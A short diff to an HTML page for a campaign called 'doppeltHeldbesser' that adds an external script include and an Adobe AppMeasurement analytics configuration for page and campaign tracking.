@@ -35,6 +35,28 @@
 <script src="js/jquery.bxslider.js"></script>
 <script src="js/game.js"></script>
 <script src="js/newJS.js"></script>
+<script type="text/javascript" src="http://mynickid.com/assets/kobra.v2.js"></script>
 
 
 <script src="js/translation.js"></script>
+<script src="js/AppMeasurement.js"></script>
+<script>
+
+    s = new AppMeasurement()
+    // Site dependent info: need to be done only once per site(country)
+    s.account = "doppeltheldbesser"    // The account should be custom for each omniture suite that we want to track to.
+    s.charSet = "UTF-8"
+    s.currencyCode = ""
+    // Etc..
+
+    // Specific page tracking  (e.g a to sent each page) (you can extend the object params)
+    s.pageName    = "doppeltHeldbesser"
+    s.pageType    = ""
+    s.server      = ""
+    s.channel     = ""
+    s.referrer    = ""
+    s.hier1       = "site/campaign/doppelHeldbesser"
+    s.campaign    = "doppeltHeldbesser"
+
+
+</script>
